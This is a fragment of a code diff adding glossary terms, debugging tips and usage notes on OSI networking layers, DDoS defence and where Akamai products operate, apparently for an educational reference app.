+        { term: "Port", definition: "Layer 4 number directing traffic to a specific service (80=HTTP, 443=HTTPS, 53=DNS)" },
+        { term: "SYN Flood", definition: "Layer 4 DDoS attack — sending millions of TCP SYN packets to exhaust server connections" },
+        { term: "Encapsulation", definition: "Each layer wrapping data with its own header as it travels down the stack" },
+        { term: "RTT", definition: "Round-Trip Time — time for a packet to travel to destination and back" },
+        { term: "Anycast", definition: "Same IP announced from multiple locations — traffic routes to nearest (Layer 3)" },
+        { term: "BGP", definition: "Border Gateway Protocol — how routers share routing information across the internet" },
+      ]},
+    ],
+    tips: [
+      "When debugging network issues, identify the layer first: Can't reach the server at all? Layer 3 (routing/IP). Connection resets? Layer 4 (TCP). 403 Forbidden? Layer 7 (WAF/app).",
+      "Layer 3/4 DDoS requires bandwidth to absorb. Layer 7 DDoS requires intelligence to detect. You need both.",
+      "TLS operates at Layer 6 — it encrypts everything above it (Layer 7 HTTP data) but the layers below (IP addresses, ports) are still visible to the network",
+      "Most Akamai products you configure operate at Layer 7. DDoS protection and Prolexic operate at Layer 3/4. Understanding this helps you pick the right product.",
+    ],
+    whenToUse: [
+      "You need to understand why different attacks require different defenses (Layer 3/4 vs Layer 7)",
+      "Debugging network issues — identifying which layer the problem is at saves hours",
+      "Understanding where TLS, DNS, CDN, and WAF fit in the networking stack",
+      "Communicating with network engineers — the OSI model is the shared vocabulary",
     ],
   },
 };
